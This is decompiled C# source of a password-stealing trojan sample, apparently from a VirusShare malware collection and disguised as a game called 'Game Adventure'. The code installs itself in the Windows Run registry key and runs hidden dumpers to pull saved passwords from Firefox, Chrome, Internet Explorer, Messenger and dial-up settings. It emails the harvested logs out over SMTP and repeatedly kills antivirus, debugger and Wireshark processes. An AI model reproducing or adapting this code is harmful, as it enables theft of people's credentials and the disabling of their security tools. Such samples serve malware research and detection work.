// Decompiled with JetBrains decompiler
// Type: GAdvt.Form1
// Assembly: Game Adventure, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7A3381EE-83DE-439F-8843-82BFEA0FE9F3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-PSW.MSIL.NetPass.ae-e53066ae65577479b6bc994375f11052b92c4a57e0196fa08c918c9048d6443f.exe

using GAdvt.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace GAdvt
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    [AccessedThroughProperty("TextBox5")]
    private TextBox _TextBox5;
    private string antis;
    private string[] optionz;
    private string emailAddress;
    private string emailPassword;
    private string emailSmtp;
    private string emailPort;
    private string stub;
    private string msgTitle;
    private string msgBody;
    private const string FileSplit = "@therefengerulezagain@";

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.TextBox4 = new TextBox();
      this.TextBox5 = new TextBox();
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(21, 94);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(248, 155);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(21, 33);
      Point point3 = point1;
      textBox2_1.Location = point3;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(81, 20);
      Size size3 = size1;
      textBox2_2.Size = size3;
      this.TextBox2.TabIndex = 1;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(144, 34);
      Point point4 = point1;
      textBox3_1.Location = point4;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(96, 20);
      Size size4 = size1;
      textBox3_2.Size = size4;
      this.TextBox3.TabIndex = 2;
      TextBox textBox4_1 = this.TextBox4;
      point1 = new Point(21, 59);
      Point point5 = point1;
      textBox4_1.Location = point5;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      size1 = new Size(96, 20);
      Size size5 = size1;
      textBox4_2.Size = size5;
      this.TextBox4.TabIndex = 3;
      TextBox textBox5_1 = this.TextBox5;
      point1 = new Point(144, 60);
      Point point6 = point1;
      textBox5_1.Location = point6;
      this.TextBox5.Name = "TextBox5";
      TextBox textBox5_2 = this.TextBox5;
      size1 = new Size(96, 20);
      Size size6 = size1;
      textBox5_2.Size = size6;
      this.TextBox5.TabIndex = 4;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(373, 270);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox5);
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.Manual;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual TextBox TextBox4
    {
      [DebuggerNonUserCode] get => this._TextBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    internal virtual TextBox TextBox5
    {
      [DebuggerNonUserCode] get => this._TextBox5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox5 = value;
    }

    public string DialUpPWshow()
    {
      byte[] dialupass = GAdvt.My.Resources.Resources.Dialupass;
      FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\dialup.exe", OpenMode.Binary);
      FileSystem.FilePut(1, (Array) dialupass, -1L, false, false);
      FileSystem.FileClose(1);
      Interaction.Shell(Interaction.Environ("tmp") + "\\dialup.exe /stext " + Interaction.Environ("tmp") + "\\data.txt", AppWinStyle.Hide);
      return System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\data.txt");
    }

    public string IE()
    {
      byte[] iepv = GAdvt.My.Resources.Resources.iepv;
      FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\iepv.exe", OpenMode.Binary);
      FileSystem.FilePut(1, (Array) iepv, -1L, false, false);
      FileSystem.FileClose(1);
      Interaction.Shell(Interaction.Environ("tmp") + "\\iepv.exe /stext " + Interaction.Environ("tmp") + "\\iepv.txt", AppWinStyle.Hide);
      return System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\iepv.txt");
    }

    public string mess()
    {
      byte[] mspass = GAdvt.My.Resources.Resources.mspass;
      FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\mspass.exe", OpenMode.Binary);
      FileSystem.FilePut(1, (Array) mspass, -1L, false, false);
      FileSystem.FileClose(1);
      Interaction.Shell(Interaction.Environ("tmp") + "\\mspass.exe /stext " + Interaction.Environ("tmp") + "\\mess.txt", AppWinStyle.Hide);
      return System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\mess.txt");
    }

    public string firefoxpass()
    {
      byte[] passwordFox = GAdvt.My.Resources.Resources.PasswordFox;
      FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\passwordfox.exe", OpenMode.Binary);
      FileSystem.FilePut(1, (Array) passwordFox, -1L, false, false);
      FileSystem.FileClose(1);
      Interaction.Shell(Interaction.Environ("tmp") + "\\passwordfox.exe /stext " + Interaction.Environ("tmp") + "\\firefox.txt", AppWinStyle.Hide);
      return System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\firefox.txt");
    }

    public string chrome()
    {
      byte[] chromePass = GAdvt.My.Resources.Resources.ChromePass;
      FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\ChromePass.exe", OpenMode.Binary);
      FileSystem.FilePut(1, (Array) chromePass, -1L, false, false);
      FileSystem.FileClose(1);
      Interaction.Shell(Interaction.Environ("tmp") + "\\ChromePass.exe /stext " + Interaction.Environ("tmp") + "\\ChromePass.txt", AppWinStyle.Hide);
      return System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\ChromePass.txt");
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.nonsense();
      this.Visible = false;
    }

    public void nonsense() => this.thiswillmaketheprocesslonger(3);

    public void thiswillmaketheprocesslonger(int x)
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        if (checked (x * x + 1) != 10)
        {
          ProjectData.EndApp();
          goto label_55;
        }
        else
        {
label_2:
          num3 = 4;
        }
label_3:
        num3 = 5;
        Form1.AddStartup(this.Text, Application.ExecutablePath);
label_4:
        num3 = 6;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_5:
        num3 = 7;
        this.emailAddress = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_6:
        num3 = 8;
        this.emailPassword = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_7:
        num3 = 9;
        this.emailSmtp = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_8:
        num3 = 10;
        this.emailPort = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_9:
        num3 = 11;
        this.antis = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_10:
        num3 = 12;
        this.msgTitle = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_11:
        num3 = 13;
        this.msgBody = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_12:
        num3 = 14;
        FileSystem.FileGet(1, ref this.emailAddress);
label_13:
        num3 = 15;
        FileSystem.FileGet(1, ref this.emailPassword);
label_14:
        num3 = 16;
        FileSystem.FileGet(1, ref this.emailSmtp);
label_15:
        num3 = 17;
        FileSystem.FileGet(1, ref this.emailPort);
label_16:
        num3 = 18;
        FileSystem.FileGet(1, ref this.antis);
label_17:
        num3 = 19;
        FileSystem.FileGet(1, ref this.msgTitle);
label_18:
        num3 = 20;
        FileSystem.FileGet(1, ref this.msgBody);
label_19:
        num3 = 21;
        FileSystem.FileClose(1);
label_20:
        num3 = 22;
        this.optionz = Strings.Split(this.emailAddress, "@therefengerulezagain@");
label_21:
        num3 = 23;
        this.TextBox2.Text = this.optionz[1];
label_22:
        num3 = 24;
        this.TextBox3.Text = this.optionz[2];
label_23:
        num3 = 25;
        this.TextBox4.Text = this.optionz[3];
label_24:
        num3 = 26;
        this.TextBox5.Text = this.optionz[4];
label_25:
        num3 = 27;
        if (Operators.CompareString(this.optionz[5], "False", false) == 0)
          goto label_28;
label_26:
        num3 = 29;
label_27:
        num3 = 30;
        this.Timer3.Start();
label_28:
        num3 = 32;
        if (!(Operators.CompareString(this.optionz[6], "", false) != 0 | Operators.CompareString(this.optionz[7], "", false) != 0))
          goto label_30;
label_29:
        num3 = 33;
        int num4 = (int) Interaction.MsgBox((object) this.optionz[7], MsgBoxStyle.Critical, (object) this.optionz[6]);
label_30:
        ProjectData.ClearProjectError();
        num1 = -2;
label_31:
        num3 = 36;
        this.DialUpPWshow();
label_32:
        num3 = 37;
        this.firefoxpass();
label_33:
        num3 = 38;
        this.mess();
label_34:
        num3 = 39;
        this.IE();
label_35:
        num3 = 40;
        this.chrome();
label_36:
        num3 = 41;
        this.TextBox1.Text = System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\firefox.txt") + System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\data.txt") + System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\mess.txt") + System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\iepv.txt") + System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\ChromePass.txt");
label_37:
        ProjectData.ClearProjectError();
        num1 = 2;
label_38:
        num3 = 43;
        MailMessage message = new MailMessage();
label_39:
        num3 = 44;
        message.From = new MailAddress(this.TextBox2.Text);
label_40:
        num3 = 45;
        message.To.Add(this.TextBox2.Text);
label_41:
        num3 = 46;
        message.Subject = MyProject.Computer.Name + " : Password Logs";
label_42:
        num3 = 47;
        message.Body = this.TextBox1.Text;
label_43:
        num3 = 48;
        SmtpClient smtpClient = new SmtpClient(this.TextBox4.Text);
label_44:
        num3 = 49;
        smtpClient.Port = Conversions.ToInteger(this.TextBox5.Text);
label_45:
        num3 = 50;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text);
label_46:
        num3 = 51;
        smtpClient.EnableSsl = true;
label_47:
        num3 = 52;
        smtpClient.Send(message);
        ProjectData.EndApp();
        goto label_55;
label_50:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
              case 3:
              case 53:
              case 54:
              case 56:
              case 57:
              case 58:
                goto label_55;
              case 4:
                goto label_2;
              case 5:
                goto label_3;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 8:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 20:
                goto label_18;
              case 21:
                goto label_19;
              case 22:
                goto label_20;
              case 23:
                goto label_21;
              case 24:
                goto label_22;
              case 25:
                goto label_23;
              case 26:
                goto label_24;
              case 27:
                goto label_25;
              case 28:
              case 31:
              case 32:
                goto label_28;
              case 29:
                goto label_26;
              case 30:
                goto label_27;
              case 33:
                goto label_29;
              case 34:
              case 35:
                goto label_30;
              case 36:
                goto label_31;
              case 37:
                goto label_32;
              case 38:
                goto label_33;
              case 39:
                goto label_34;
              case 40:
                goto label_35;
              case 41:
                goto label_36;
              case 42:
                goto label_37;
              case 43:
                goto label_38;
              case 44:
                goto label_39;
              case 45:
                goto label_40;
              case 46:
                goto label_41;
              case 47:
                goto label_42;
              case 48:
                goto label_43;
              case 49:
                goto label_44;
              case 50:
                goto label_45;
              case 51:
                goto label_46;
              case 52:
                goto label_47;
              case 55:
                goto label_48;
            }
            break;
          case 2:
label_48:
            num3 = 55;
            this.Visible = false;
            ProjectData.EndApp();
            goto label_55;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_50;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_55:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      this.AntiAnubis();
      this.AntiBitDefender();
      this.AntiKaspersky();
      this.AntiKeyscrambler();
      this.AntiMalwarebytes();
      this.AntiNOD32();
      this.AntiNorman();
      this.AntiOllydbg();
      this.AntiOutpost();
      this.AntiWireshark();
      this.Visible = false;
    }

    public static void AddStartup(string Name, string Path) => Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Name, (object) Path, RegistryValueKind.String);

    public void AntiKeyscrambler()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "keyscrambler", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiWireshark()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "wireshark", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiAnubis()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "anubis", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiMalwarebytes()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "mbam", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiKaspersky()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "avp", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiOllydbg()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "ollydbg", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiOutpost()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "outpost", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiNorman()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "npfmsg", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiBitDefender()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "bdagent", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiNOD32()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "egui", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }
  }
}
